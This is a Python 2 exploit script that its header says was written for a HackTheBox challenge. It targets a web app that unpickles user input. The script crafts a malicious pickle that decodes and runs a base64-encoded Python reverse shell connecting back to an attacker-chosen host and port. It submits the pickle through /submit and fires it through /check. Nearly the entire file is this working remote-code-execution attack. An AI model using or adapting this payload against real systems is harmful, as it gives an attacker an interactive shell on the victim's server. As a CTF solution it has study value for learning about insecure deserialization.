#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#  ▄▄▄· ▄· ▄▌ ▄▄▄·▪   ▄▄· ▄ •▄ ▄▄▄ .·▄▄▄▄  ▄▄▄ ..▄▄ · ▄▄▄ .▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .                             #
# ▐█ ▄█▐█▪██▌▐█ ▄███ ▐█ ▌▪█▌▄▌▪▀▄.▀·██▪ ██ ▀▄.▀·▐█ ▀. ▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·                             #
#  ██▀·▐█▌▐█▪ ██▀·▐█·██ ▄▄▐▀▀▄·▐▀▀▪▄▐█· ▐█▌▐▀▀▪▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄                             #
# ▐█▪·• ▐█▀·.▐█▪·•▐█▌▐███▌▐█.█▌▐█▄▄▌██. ██ ▐█▄▄▌▐█▄▪▐█▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌                             #
# .▀     ▀ • .▀   ▀▀▀·▀▀▀ ·▀  ▀ ▀▀▀ ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀                              #
# pypicke_deser_rce_nc.py - nighter                                                                         #
#                                                                                                           #
# DATE                                                                                                      #
# 05/05/2018                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# This pop shell by deserialize a python pickle object                                                      #
# wrote this to be used in a challenge in hackthebox                                                       #
#                                                                                                           #
# nighter - http://nighter.se/                                                                              #
#                                                                                                           #
#############################################################################################################

import base64
import cPickle
import signal
import os
import time
import sys

from requests import post
from hashlib import md5

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)

def BuildPythonReverseShell():

    python_rev_shell = '''python2 -c \'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\
s.connect(("%s", %s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()\'''' % (LHOST, LPORT)

    return base64.b64encode(python_rev_shell)


class PicklePayload(object):

    def __reduce__(self):
        return (os.system, ('echo %s|base64 -d|bash' % BuildPythonReverseShell(),))


def createPayload():

    return cPickle.dumps(PicklePayload())


def submit(char='', quote=''):

    data = {"character": char, "quote": quote}
    submit = post(URL + '/submit', data=data)
    if submit.status_code == 200:
        print("[+] Payload")
    else:
        print("[-] Payload")


def check(p_id):
    p = post(URL + '/check', data={"id": p_id})
    print("[+] Exploit: %d" % int(p.status_code))


def exploit():

    char = createPayload() + "homer"
    quote = "pop"
    p_id = md5(char + quote).hexdigest()

    submit(char, quote)
    time.sleep(1)
    check(p_id)


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print("""
 ▄▄▄· ▄· ▄▌ ▄▄▄·▪   ▄▄· ▄ •▄ ▄▄▄ .·▄▄▄▄  ▄▄▄ ..▄▄ · ▄▄▄ .▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .
▐█ ▄█▐█▪██▌▐█ ▄███ ▐█ ▌▪█▌▄▌▪▀▄.▀·██▪ ██ ▀▄.▀·▐█ ▀. ▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·
 ██▀·▐█▌▐█▪ ██▀·▐█·██ ▄▄▐▀▀▄·▐▀▀▪▄▐█· ▐█▌▐▀▀▪▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐█▪·• ▐█▀·.▐█▪·•▐█▌▐███▌▐█.█▌▐█▄▄▌██. ██ ▐█▄▄▌▐█▄▪▐█▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌
.▀     ▀ • .▀   ▀▀▀·▀▀▀ ·▀  ▀ ▀▀▀ ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀
[nighter@nighter.se]
    """)
        print "Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0])
        print "\nEXAMPLE: ./pypickle_deser_rce_nc.py 'http://10.10.10.70' 10.10.14.24 1337\n"
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    exploit()
